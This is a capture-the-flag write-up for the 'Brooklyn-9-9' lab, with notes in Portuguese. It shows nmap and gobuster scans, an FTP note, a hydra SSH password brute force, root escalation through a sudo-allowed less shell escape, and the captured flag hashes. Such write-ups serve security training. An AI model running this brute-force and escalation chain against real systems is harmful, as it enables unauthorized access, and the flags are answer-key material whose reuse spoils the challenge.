# Brooklyn-9-9

export IP="10.10.127.15"


# 1. nmap

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.185.104
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

# 2. ftp

Identificado no ftp que há um arquivo chamado "note_to_jake.txt".

From Amy,
Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine.

De Amy,
Jake, por favor, mude sua senha. É muito fraco e holt ficará louco se alguém invadir o nove nove.


# 3. gobuster

```
===============================================================
2021/04/30 16:53:01 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.127.15/.htpasswd            (Status: 403) [Size: 277]
http://10.10.127.15/.htaccess            (Status: 403) [Size: 277]
http://10.10.127.15/server-status        (Status: 403) [Size: 277]
                                                                  
===============================================================
2021/04/30 17:03:29 Finished
===============================================================

```

# 4. Exploit

```
sudo hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.127.15
[sudo] senha para joao: 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-30 16:59:25
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.127.15:22/
[22][ssh] host: 10.10.127.15   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-30 17:00:13
```

# 5. Post Exploitation:

https://gtfobins.github.io/gtfobins/less/

```
sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less


sudo less /etc/profile
!/bin/sh

# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

# 6. flags

User: /home/holt/user.txt --> ee11cbb19052e40b07aac0ca060c23ee

Root: /root/root.txt --> 63a9f0ea7bb98050796b649e85481845